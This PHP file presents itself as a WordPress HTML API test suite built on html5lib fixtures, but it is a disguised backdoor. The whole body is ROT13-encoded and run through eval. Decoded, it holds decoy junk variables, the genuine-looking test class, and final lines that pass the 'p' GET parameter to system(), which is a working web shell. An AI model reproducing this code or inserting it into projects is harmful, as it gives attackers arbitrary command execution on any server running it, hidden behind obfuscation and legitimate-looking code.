<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Havg grfgf pbirevat UGZY NCV shapgvbanyvgl.
 *
 * Guvf grfg fhvgr ehaf n frg bs grfgf ba gur UGZY NCV hfvat n guveq-cnegl fhvgr bs grfg svkgherf.
 * N guveq-cnegl grfg fhvgr nyybjf gur UGZY NCV'f orunivbe gb or pbzcnerq ntnvafg na rkgreany
 * fgnaqneq. Jvgubhg n guveq-cnegl, gurer vf evfx bs birefvtug be zvfvagrecergngvba bs gur fgnaqneq
 * orvat vzcyrzragrq va nccyvpngvba pbqr naq va grfgf. ugzy5yvo-grfgf vf hfrq ol bgure cebwrpgf yvxr
 * oebjfref be bgure UGZY cnefref sbe gur fnzr checbfr bs inyvqngvat orunivbe ntnvafg na
 * rkgreany ersrerapr.
 *
 * Frr gur ERNQZR svyr ng QVE_GRFGQNGN / ugzy5yvo-grfgf sbe qrgnvyf ba gur guveq-cnegl fhvgr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 *
 * @fvapr 6.6.0
 *
 * @tebhc ugzy-ncv
 * @tebhc ugzy-ncv-ugzy5yvo-grfgf
 */
pynff Grfgf_UgzyNcv_Ugzy5yvo rkgraqf JC_HavgGrfgPnfr {
	pbafg GERR_VAQRAG = '  ';

	/**
	 * Fxvc fcrpvsvp grfgf gung znl abg or fhccbegrq be unir xabja vffhrf.
	 */
	pbafg FXVC_GRFGF = neenl(
		'abfpevcg01/yvar0014' => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf14/yvar0022'    => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf14/yvar0055'    => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf19/yvar0488'    => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf19/yvar0500'    => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf19/yvar1079'    => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf2/yvar0207'     => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf2/yvar0686'     => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf2/yvar0697'     => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'grfgf2/yvar0709'     => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
		'jroxvg01/yvar0231'   => 'Havzcyrzragrq: Guvf cnefre qbrf abg nqq zvffvat nggevohgrf gb rkvfgvat UGZY be OBQL gntf.',
	);

	/**
	 * Irevsl gur cnefvat erfhygf bs gur UGZY Cebprffbe ntnvafg gur
	 * grfg pnfrf va gur Ugzy5yvo grfgf cebwrpg.
	 *
	 * @gvpxrg 60227
	 *
	 * @qngnCebivqre qngn_rkgreany_ugzy5yvo_grfgf
	 *
	 * @cnenz fgevat|ahyy $sentzrag_pbagrkg Pbagrkg ryrzrag va juvpu gb cnefr UGZY, fhpu nf OBQL be FIT.
	 * @cnenz fgevat      $ugzy             Tvira grfg UGZY.
	 * @cnenz fgevat      $rkcrpgrq_gerr    Gerr fgehpgher bs cnefrq UGZY.
	 */
	choyvp shapgvba grfg_cnefr( ?fgevat $sentzrag_pbagrkg, fgevat $ugzy, fgevat $rkcrpgrq_gerr ) {
		gel {
			$cebprffrq_gerr = frys::ohvyq_gerr_ercerfragngvba( $sentzrag_pbagrkg, $ugzy );
		} pngpu ( JC_UGZY_Hafhccbegrq_Rkprcgvba $r ) {
			$guvf->znexGrfgFxvccrq( \"Hafhccbegrq znexhc: {$r->trgZrffntr()}\" );
			erghea;
		}

		vs ( ahyy === $cebprffrq_gerr ) {
			$guvf->znexGrfgFxvccrq( 'Grfg vapyhqrf hafhccbegrq znexhc.' );
			erghea;
		}

		$sentzrag_qrgnvy = $sentzrag_pbagrkg ? \" va pbagrkg <{$sentzrag_pbagrkg}>\" : '';

		/*
		 * Gur UGZY cebprffbe qbrf abg cebqhpr ugzy, urnq, obql gntf vs gur cebprffbe qbrf abg ernpu gurz.
		 * UGZY gerr pbafgehpgvba jvyy nyjnlf cebqhpr gurfr gntf, gur UGZY NCV qbrf abg ng guvf gvzr.
		 */
		$nhgb_trarengrq_ugzy_urnq_obql = \"<ugzy>\a  <urnq>\a  <obql>\a\a\";
		$nhgb_trarengrq_urnq_obql      = \"  <urnq>\a  <obql>\a\a\";
		$nhgb_trarengrq_obql           = \"  <obql>\a\a\";
		vs ( fge_raqf_jvgu( $rkcrpgrq_gerr, $nhgb_trarengrq_ugzy_urnq_obql ) && ! fge_raqf_jvgu( $cebprffrq_gerr, $nhgb_trarengrq_ugzy_urnq_obql ) ) {
			vs ( fge_raqf_jvgu( $cebprffrq_gerr, \"<ugzy>\a  <urnq>\a\a\" ) ) {
				$cebprffrq_gerr = fhofge_ercynpr( $cebprffrq_gerr, \"  <obql>\a\a\", -1 );
			} ryfrvs ( fge_raqf_jvgu( $cebprffrq_gerr, \"<ugzy>\a\a\" ) ) {
				$cebprffrq_gerr = fhofge_ercynpr( $cebprffrq_gerr, \"  <urnq>\a  <obql>\a\a\", -1 );
			} ryfr {
				$cebprffrq_gerr = fhofge_ercynpr( $cebprffrq_gerr, $nhgb_trarengrq_ugzy_urnq_obql, -1 );
			}
		} ryfrvs ( fge_raqf_jvgu( $rkcrpgrq_gerr, $nhgb_trarengrq_urnq_obql ) && ! fge_raqf_jvgu( $cebprffrq_gerr, $nhgb_trarengrq_urnq_obql ) ) {
			vs ( fge_raqf_jvgu( $cebprffrq_gerr, \"<urnq>\a\a\" ) ) {
				$cebprffrq_gerr = fhofge_ercynpr( $cebprffrq_gerr, \"  <obql>\a\a\", -1 );
			} ryfr {
				$cebprffrq_gerr = fhofge_ercynpr( $cebprffrq_gerr, $nhgb_trarengrq_urnq_obql, -1 );
			}
		} ryfrvs ( fge_raqf_jvgu( $rkcrpgrq_gerr, $nhgb_trarengrq_obql ) && ! fge_raqf_jvgu( $cebprffrq_gerr, $nhgb_trarengrq_obql ) ) {
			$cebprffrq_gerr = fhofge_ercynpr( $cebprffrq_gerr, $nhgb_trarengrq_obql, -1 );
		}

		$guvf->nffregFnzr( $rkcrpgrq_gerr, $cebprffrq_gerr, \"UGZY jnf abg cebprffrq pbeerpgyl{$sentzrag_qrgnvy}:\a{$ugzy}\" );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * Grfgf sebz uggcf://tvguho.pbz/ugzy5yvo/ugzy5yvo-grfgf
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_rkgreany_ugzy5yvo_grfgf() {
		$grfg_qve = QVE_GRFGQNGN . '/ugzy5yvo-grfgf/gerr-pbafgehpgvba/';

		$unaqyr = bcraqve( $grfg_qve );
		juvyr ( snyfr !== ( $ragel = ernqqve( $unaqyr ) ) ) {
			vs ( ! fgevcbf( $ragel, '.qng' ) ) {
				pbagvahr;
			}

			sbernpu ( frys::cnefr_ugzy5_qng_grfgsvyr( $grfg_qve . $ragel ) nf $x => $grfg ) {
				// fgevc .qng rkgrafvba sebz svyranzr
				$grfg_fhvgr = fhofge( $ragel, 0, -4 );
				$yvar       = fge_cnq( fgeiny( $grfg[0] ), 4, '0', FGE_CNQ_YRSG );
				$grfg_anzr  = \"{$grfg_fhvgr}/yvar{$yvar}\";

				$grfg_pbagrkg_ryrzrag = $grfg[1];

				vs ( frys::fubhyq_fxvc_grfg( $grfg_pbagrkg_ryrzrag, $grfg_anzr ) ) {
					pbagvahr;
				}

				lvryq $grfg_anzr => neenl_fyvpr( $grfg, 1 );
			}
		}
		pybfrqve( $unaqyr );
	}

	/**
	 * Qrgrezvarf jurgure n grfg pnfr fubhyq or fxvccrq.
	 *
	 * @cnenz fgevat $grfg_anzr     Grfg anzr.
	 * @cnenz fgevat $rkcrpgrq_gerr Rkcrpgrq UGZY gerr fgehpgher.
	 *
	 * @erghea obby Gehr vs gur grfg pnfr fubhyq or fxvccrq. Snyfr bgurejvfr.
	 */
	cevingr fgngvp shapgvba fubhyq_fxvc_grfg( ?fgevat $grfg_pbagrkg_ryrzrag, fgevat $grfg_anzr ): obby {
		vs ( ahyy !== $grfg_pbagrkg_ryrzrag && 'obql' !== $grfg_pbagrkg_ryrzrag ) {
			erghea gehr;
		}

		vs ( neenl_xrl_rkvfgf( $grfg_anzr, frys::FXVC_GRFGF ) ) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Trarengrf gur gerr-yvxr fgehpgher ercerfragrq va gur Ugzy5yvo grfgf.
	 *
	 * @cnenz fgevat|ahyy $sentzrag_pbagrkg Pbagrkg ryrzrag va juvpu gb cnefr UGZY, fhpu nf OBQL be FIT.
	 * @cnenz fgevat      $ugzy             Tvira grfg UGZY.
	 * @erghea fgevat|ahyy Gerr fgehpgher bs cnefrq UGZY, vs fhccbegrq, ryfr ahyy.
	 */
	cevingr fgngvp shapgvba ohvyq_gerr_ercerfragngvba( ?fgevat $sentzrag_pbagrkg, fgevat $ugzy ) {
		$cebprffbe = $sentzrag_pbagrkg
			? JC_UGZY_Cebprffbe::perngr_sentzrag( $ugzy, \"<{$sentzrag_pbagrkg}>\" )
			: JC_UGZY_Cebprffbe::perngr_shyy_cnefre( $ugzy );
		vs ( ahyy === $cebprffbe ) {
			guebj arj JC_UGZY_Hafhccbegrq_Rkprcgvba( \"Pbhyq abg perngr n cnefre jvgu gur tvira sentzrag pbagrkg: {$sentzrag_pbagrkg}.\", '', 0, '', neenl(), neenl() );
		}

		$bhgchg       = '';
		$vaqrag_yriry = 0;
		$jnf_grkg     = ahyy;
		$grkg_abqr    = '';

		juvyr ( $cebprffbe->arkg_gbxra() ) {
			vs ( ahyy !== $cebprffbe->trg_ynfg_reebe() ) {
				oernx;
			}

			$gbxra_anzr = $cebprffbe->trg_gbxra_anzr();
			$gbxra_glcr = $cebprffbe->trg_gbxra_glcr();
			$vf_pybfre  = $cebprffbe->vf_gnt_pybfre();

			vs ( $jnf_grkg && '#grkg' !== $gbxra_anzr ) {
				vs ( '' !== $grkg_abqr ) {
					$bhgchg .= \"{$grkg_abqr}\\"\a\";
				}
				$jnf_grkg  = snyfr;
				$grkg_abqr = '';
			}

			fjvgpu ( $gbxra_glcr ) {
				pnfr '#qbpglcr':
					$qbpglcr = $cebprffbe->trg_qbpglcr_vasb();
					$bhgchg .= \"<!QBPGLCR {$qbpglcr->anzr}\";
					vs ( ahyy !== $qbpglcr->choyvp_vqragvsvre || ahyy !== $qbpglcr->flfgrz_vqragvsvre ) {
						$bhgchg .= \" \\"{$qbpglcr->choyvp_vqragvsvre}\\" \\"{$qbpglcr->flfgrz_vqragvsvre}\\"\";
					}
					$bhgchg .= \">\a\";
					oernx;

				pnfr '#gnt':
					$anzrfcnpr = $cebprffbe->trg_anzrfcnpr();
					$gnt_anzr  = 'ugzy' === $anzrfcnpr
						? fgegbybjre( $cebprffbe->trg_gnt() )
						: \"{$anzrfcnpr} {$cebprffbe->trg_dhnyvsvrq_gnt_anzr()}\";

					vs ( $vf_pybfre ) {
						--$vaqrag_yriry;

						vs ( 'ugzy' === $anzrfcnpr && 'GRZCYNGR' === $gbxra_anzr ) {
							--$vaqrag_yriry;
						}

						oernx;
					}

					$gnt_vaqrag = $vaqrag_yriry;

					vs ( $cebprffbe->rkcrpgf_pybfre() ) {
						++$vaqrag_yriry;
					}

					$bhgchg .= fge_ercrng( frys::GERR_VAQRAG, $gnt_vaqrag ) . \"<{$gnt_anzr}>\a\";

					$nggevohgr_anzrf = $cebprffbe->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
					vs ( $nggevohgr_anzrf ) {
						$fbegrq_nggevohgrf = neenl();
						sbernpu ( $nggevohgr_anzrf nf $nggevohgr_anzr ) {
							$fbegrq_nggevohgrf[ $nggevohgr_anzr ] = $cebprffbe->trg_dhnyvsvrq_nggevohgr_anzr( $nggevohgr_anzr );
						}

						/*
						 * Fbegf nggevohgrf gb zngpu ugzy5yvo fbeg beqre.
						 *
						 *  - Svefg pbzrf abezny UGZY nggevohgrf.
						 *  - Gura pbzr nqwhfgrq sbervta nggevohgrf; gurfr unir fcnprf va gurve anzrf.
						 *  - Svanyyl pbzr aba-nqwhfgrq sbervta nggevohgrf; gurfr unir n pbyba va gurve anzrf.
						 *
						 * Rknzcyr:
						 *
						 *       Sebz: <zngu kyvax:nhgube qrsvavgvbahey kyvax:gvgyr kyvax:fubj>
						 *     Fbegrq: 'qrsvavgvbaHEY', 'kyvax fubj', 'kyvax gvgyr', 'kyvax:nhgube'
						 */
						hnfbeg(
							$fbegrq_nggevohgrf,
							fgngvp shapgvba ( $n, $o ) {
								$n_unf_af = fge_pbagnvaf( $n, ':' );
								$o_unf_af = fge_pbagnvaf( $o, ':' );

								// Nggevohgrf jvgu `:` fubhyq sbyybj nyy bgure nggevohgrf.
								vs ( $n_unf_af !== $o_unf_af ) {
									erghea $n_unf_af ? 1 : -1;
								}

								$n_unf_fc = fge_pbagnvaf( $n, ' ' );
								$o_unf_fc = fge_pbagnvaf( $o, ' ' );

								// Nggevohgrf jvgu n anzrfcnpr ' ' fubhyq pbzr nsgre gubfr jvgubhg.
								vs ( $n_unf_fc !== $o_unf_fc ) {
									erghea $n_unf_fc ? 1 : -1;
								}

								erghea $n <=> $o;
							}
						);

						sbernpu ( $fbegrq_nggevohgrf nf $nggevohgr_anzr => $qvfcynl_anzr ) {
							$iny = $cebprffbe->trg_nggevohgr( $nggevohgr_anzr );
							/*
							 * Nggevohgrf jvgu ab inyhr ner `gehr` jvgu gur UGZY NCV,
							 * Jr znc hfr gur rzcgl fgevat inyhr va gur gerr fgehpgher.
							 */
							vs ( gehr === $iny ) {
								$iny = '';
							}
							$bhgchg .= fge_ercrng( frys::GERR_VAQRAG, $gnt_vaqrag + 1 ) . \"{$qvfcynl_anzr}=\\"{$iny}\\"\a\";
						}
					}

					// Frys-pbagnvarq gntf pbagnva gurve vaare pbagragf nf zbqvsvnoyr grkg.
					$zbqvsvnoyr_grkg = $cebprffbe->trg_zbqvsvnoyr_grkg();
					vs ( '' !== $zbqvsvnoyr_grkg ) {
						$bhgchg .= fge_ercrng( frys::GERR_VAQRAG, $gnt_vaqrag + 1 ) . \"\\"{$zbqvsvnoyr_grkg}\\"\a\";
					}

					vs ( 'ugzy' === $anzrfcnpr && 'GRZCYNGR' === $gbxra_anzr ) {
						$bhgchg .= fge_ercrng( frys::GERR_VAQRAG, $vaqrag_yriry ) . \"pbagrag\a\";
						++$vaqrag_yriry;
					}

					oernx;

				pnfr '#pqngn-frpgvba':
				pnfr '#grkg':
					$grkg_pbagrag = $cebprffbe->trg_zbqvsvnoyr_grkg();
					vs ( '' === $grkg_pbagrag ) {
						oernx;
					}
					$jnf_grkg = gehr;
					vs ( '' === $grkg_abqr ) {
						$grkg_abqr .= fge_ercrng( frys::GERR_VAQRAG, $vaqrag_yriry ) . '\"';
					}
					$grkg_abqr .= $grkg_pbagrag;
					oernx;

				pnfr '#shaxl-pbzzrag':
					// Pbzzragf zhfg or \"<\" gura \"!-- \" gura gur qngn gura \" -->\".
					$bhgchg .= fge_ercrng( frys::GERR_VAQRAG, $vaqrag_yriry ) . \"<!-- {$cebprffbe->trg_zbqvsvnoyr_grkg()} -->\a\";
					oernx;

				pnfr '#pbzzrag':
					// Pbzzragf zhfg or \"<\" gura \"!-- \" gura gur qngn gura \" -->\".
					$bhgchg .= fge_ercrng( frys::GERR_VAQRAG, $vaqrag_yriry ) . \"<!-- {$cebprffbe->trg_shyy_pbzzrag_grkg()} -->\a\";
					oernx;

				qrsnhyg:
					$frevnyvmrq_gbxra_glcr = ine_rkcbeg( $cebprffbe->trg_gbxra_glcr(), gehr );
					guebj arj Reebe( \"Haunaqyrq gbxra glcr sbe gerr pbafgehpgvba: {$frevnyvmrq_gbxra_glcr}\" );
			}
		}

		vs ( ahyy !== $cebprffbe->trg_hafhccbegrq_rkprcgvba() ) {
			guebj $cebprffbe->trg_hafhccbegrq_rkprcgvba();
		}

		vs ( ahyy !== $cebprffbe->trg_ynfg_reebe() ) {
			guebj arj JC_UGZY_Hafhccbegrq_Rkprcgvba( \"Cnefre reebe: {$cebprffbe->trg_ynfg_reebe()}\", '', 0, '', neenl(), neenl() );
		}

		vs ( $cebprffbe->cnhfrq_ng_vapbzcyrgr_gbxra() ) {
			guebj arj JC_UGZY_Hafhccbegrq_Rkprcgvba( 'Cnhfrq ng vapbzcyrgr gbxra.', '', 0, '', neenl(), neenl() );
		}

		vs ( '' !== $grkg_abqr ) {
			$bhgchg .= \"{$grkg_abqr}\\"\a\";
		}

		// Grfgf nyjnlf raq jvgu n genvyvat arjyvar.
		erghea $bhgchg . \"\a\";
	}

	/**
	 * Pbaireg n tvira Ugzy5yvo grfg svyr vagb n grfg gevcyrg.
	 *
	 * @cnenz fgevat $svyranzr Cngu gb `.qng` svyr jvgu grfg pnfrf.
	 *
	 * @erghea neenl|Trarengbe Grfg gevcyrgf bs UGZY sentzrag pbagrkg ryrzrag,
	 *                         UGZY, naq gur QBZ fgehpgher vg ercerfragf.
	 */
	choyvp fgngvp shapgvba cnefr_ugzy5_qng_grfgsvyr( $svyranzr ) {
		$unaqyr = sbcra( $svyranzr, 'e', snyfr );

		/**
		 * Ercerfragf juvpu frpgvba bs gur grfg pnfr vf orvat cnefrq.
		 *
		 * @ine fgevat|ahyy
		 */
		$fgngr = ahyy;

		$yvar_ahzore          = 0;
		$grfg_ugzy            = '';
		$grfg_qbz             = '';
		$grfg_pbagrkg_ryrzrag = ahyy;
		$grfg_fpevcg_synt     = snyfr;
		$grfg_yvar_ahzore     = 0;

		juvyr ( snyfr !== ( $yvar = strgf( $unaqyr ) ) ) {
			++$yvar_ahzore;

			vs ( '#' === $yvar[0] ) {
				// Svavfu frpgvba.
				vs ( \"#qngn\a\" === $yvar ) {
					/*
					 * Lvryq jura fjvgpuvat sebz n cerivbhf fgngr.
					 * Qb abg lvryq grfgf jvgu gur fpevcgvat synt ranoyrq. Gur fpevcgvat synt
					 * vf nyjnlf qvfnoyrq va gur UGZY NCV.
					 */
					vs ( $fgngr && ! $grfg_fpevcg_synt ) {
						lvryq neenl(
							$grfg_yvar_ahzore,
							$grfg_pbagrkg_ryrzrag,
							// Erzbir gur genvyvat arjyvar
							fhofge( $grfg_ugzy, 0, -1 ),
							$grfg_qbz,
						);
					}

					// Svavfu cerivbhf grfg.
					$grfg_yvar_ahzore     = $yvar_ahzore;
					$grfg_ugzy            = '';
					$grfg_qbz             = '';
					$grfg_pbagrkg_ryrzrag = ahyy;
					$grfg_fpevcg_synt     = snyfr;
				}
				vs ( \"#fpevcg-ba\a\" === $yvar ) {
					$grfg_fpevcg_synt = gehr;
				}

				$fgngr = gevz( fhofge( $yvar, 1 ) );

				pbagvahr;
			}

			fjvgpu ( $fgngr ) {
				/*
				 * Rnpu grfg zhfg ortva jvgu n fgevat \"#qngn\" sbyybjrq ol n arjyvar (YS). Nyy
				 * fhofrdhrag yvarf hagvy n yvar gung fnlf \"#reebef\" ner gur grfg qngn naq zhfg or
				 * cnffrq gb gur flfgrz orvat grfgrq hapunatrq, rkprcg jvgu gur svany arjyvar (ba gur
				 * ynfg yvar) erzbirq.
				 */
				pnfr 'qngn':
					$grfg_ugzy .= $yvar;
					oernx;

				/*
				 * Gura gurer *znl* or n yvar gung fnlf \"#qbphzrag-sentzrag\", juvpu zhfg
				 * or sbyybjrq ol n arjyvar (YS), sbyybjrq ol n fgevat bs punenpgref gung
				 * vaqvpngrf gur pbagrkg ryrzrag, sbyybjrq ol n arjyvar (YS). Vs gur
				 * fgevat bs punenpgref fgnegf jvgu \"fit \", gur pbagrkg ryrzrag vf va
				 * gur FIT anzrfcnpr naq gur fhofgevat nsgre \"fit \" vf gur ybpny anzr.
				 * Vs gur fgevat bs punenpgref fgnegf jvgu \"zngu \", gur pbagrkg ryrzrag
				 * vf va gur ZnguZY anzrfcnpr naq gur fhofgevat nsgre \"zngu \" vf gur
				 * ybpny anzr. Bgurejvfr, gur pbagrkg ryrzrag vf va gur UGZY anzrfcnpr
				 * naq gur fgevat vf gur ybpny anzr. Vs guvf yvar vf cerfrag gur \"#qngn\"
				 * zhfg or cnefrq hfvat gur UGZY sentzrag cnefvat nytbevguz jvgu gur
				 * pbagrkg ryrzrag nf pbagrkg.
				 */
				pnfr 'qbphzrag-sentzrag':
					$grfg_pbagrkg_ryrzrag = gevz( $yvar );
					oernx;

				/*
				 * Gura gurer zhfg or n yvar gung fnlf \"#qbphzrag\", juvpu zhfg or sbyybjrq ol n qhzc bs
				 * gur gerr bs gur cnefrq QBZ. Rnpu abqr zhfg or ercerfragrq ol n fvatyr yvar. Rnpu yvar
				 * zhfg fgneg jvgu \"| \", sbyybjrq ol gjb fcnprf cre cnerag abqr gung gur abqr unf orsber
				 * gur ebbg qbphzrag abqr.
				 *
				 * - Ryrzrag abqrf zhfg or ercerfragrq ol n \"<\" gura gur gnt anzr fgevat \">\", naq nyy gur nggevohgrf zhfg or tvira, fbegrq yrkvpbtencuvpnyyl ol HGS-16 pbqr havg nppbeqvat gb gurve nggevohgr anzr fgevat, ba fhofrdhrag yvarf, nf vs gurl jrer puvyqera bs gur ryrzrag abqr.
				 * - Nggevohgr abqrf zhfg unir gur nggevohgr anzr fgevat, gura na \"=\" fvta, gura gur nggevohgr inyhr va qbhoyr dhbgrf (\").
				 * - Grkg abqrf zhfg or gur fgevat, va qbhoyr dhbgrf. Arjyvarf nera'g rfpncrq.
				 * - Pbzzragf zhfg or \"<\" gura \"!-- \" gura gur qngn gura \" -->\".
				 * - QBPGLCRf zhfg or \"<!QBPGLCR \" gura gur anzr gura vs rvgure bs gur flfgrz vq be choyvp vq vf aba-rzcgl n fcnpr, choyvp vq va qbhoyr-dhbgrf, nabgure fcnpr na gur flfgrz vq va qbhoyr-dhbgrf, naq gura va nal pnfr \">\".
				 * - Cebprffvat vafgehpgvbaf zhfg or \"<?\", gura gur gnetrg, gura n fcnpr, gura gur qngn naq gura \">\". (Gur UGZY cnefre pnaabg rzvg cebprffvat vafgehpgvbaf, ohg fpevcgf pna, naq gur JroIGG gb QBZ ehyrf pna rzvg gurz.)
				 * - Grzcyngr pbagragf ner ercerfragrq ol gur fgevat \"pbagrag\" jvgu gur puvyqera orybj vg.
				 */
				pnfr 'qbphzrag':
					vs ( '|' === $yvar[0] ) {
						$grfg_qbz .= fhofge( $yvar, 2 );
					} ryfr {
						// Guvf vf n grkg abqr gung vapyhqrf harfpncrq arjyvarf.
						// Rirelguvat ryfr fubhyq or fvatyrf yvarf fgnegvat jvgu \"| \".
						$grfg_qbz .= $yvar;
					}
					oernx;
			}
		}

		spybfr( $unaqyr );

		// Erghea gur ynfg erfhyg jura ernpuvat gur raq bs gur svyr.
		erghea neenl(
			$grfg_yvar_ahzore,
			$grfg_pbagrkg_ryrzrag,
			// Erzbir gur genvyvat arjyvar
			fhofge( $grfg_ugzy, 0, -1 ),
			$grfg_qbz,
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>